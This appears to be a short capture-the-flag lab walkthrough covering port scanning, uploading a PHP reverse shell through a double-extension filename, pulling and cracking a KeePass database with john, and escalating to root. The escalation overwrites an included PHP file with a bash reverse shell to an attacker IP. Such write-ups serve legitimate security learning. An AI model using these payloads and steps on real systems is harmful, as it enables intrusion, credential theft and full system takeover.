### nmap
PORT    STATE SERVICE     VERSION 
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)  
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))  
139/tcp open  netbios-ssn Samba smbd 4.6.2  
445/tcp open  netbios-ssn Samba smbd 4.6.2  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

## directory enumeration  
/cloud 
File upload from External server.  
1. Start python server on kali machine
python -m http.server  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
2. Rename shell to php-reverse-shell.php#.jpg and also keep php-reverse-shell.php in the same folder  
3. start nc -nlvp 4444  
4. Upload the file  
5. We get reverse shell

## remote machine /opt folder  
There is a dataset.kdbx file  
.kdbx file is a KeePass password database—it's encrypted and used to securely store usernames, passwords, and other secrets  
1. Start python3 -m http.server  
python3 -m http.server  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
2. Go to browser and type http://10.10.208.45:8000/
3. We can downlod this dataset.kdbx file from this link to the local machine
4. python3 ../tools/keepass2john/keepass2john.py dataset.kdbx > hash.txt
5. john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
6. we get the password - 741852963
7. keepassxc  
8. enter the passkey and we get the password for sysadmin
9. get the userflag  
10. install pspy64  
11. scripts.php runs multiple times
12. script.php evlauates lib/backup.inc.php
13. require_once('lib/backup.inc.php');  Includes and evaluates the specified file only once, even if the line is called multiple times
14. so, rm backup.inc.php
15. nano backup.inc.php
16. <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.17.10.89/1234 0>&1'"); ?>
17. start nc -nlvp 1234 on local machine
18. as the script runs as per step 11
19. we get root shell on local machine  
20. Final flag  



